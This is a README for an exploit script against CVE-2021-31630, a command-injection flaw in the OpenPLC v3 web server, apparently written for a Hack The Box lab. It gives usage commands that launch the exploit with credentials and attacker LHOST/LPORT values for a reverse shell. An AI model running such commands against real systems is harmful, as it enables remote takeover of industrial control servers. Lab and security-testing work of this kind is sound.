# CVE-2021-31630
OpenPLC 3 WebServer Authenticated Remote Code Execution.

# Description
The presence of Command Injection in Open PLC Webserver v3 enables remote attackers to run arbitrary code. Only tested in HTB Wifinetictwo.htb machine.

I found problems with all the scripts that exploited the vulnerability, maybe because I'm using parrot or my browser, chromium works for login, I had login problems with Firefox and something strange happens to the web server with the POST request to log in.
I have modified the script from [thewhiteh4t](https://github.com/thewhiteh4t/cve-2021-31630) there are parts (mainly upload method) that are just copied, but I have changed the part that obtains the cookies from the server to launch the exploit.

The original PoC is provided by [Fellipe Oliveira](https://packetstormsecurity.com/files/162563/OpenPLC-WebServer-3-Remote-Code-Execution.html)

I hope it helps you if you have problems with it.

## Dependencies
```
pip3 install requests
```

## Usage
```
python3 exploit.py http://10.129.x.x:8080 user pass --lhost 10.10.x.x --lport xxxx
```

Alternative, yo can modify exploit.py
```
...
# LHOST y LPORT defaults
LHOST = '10.10.1.1'
LPORT = '4444'
...

python3 exploit.py http://10.129.x.x:8080 user pass
```
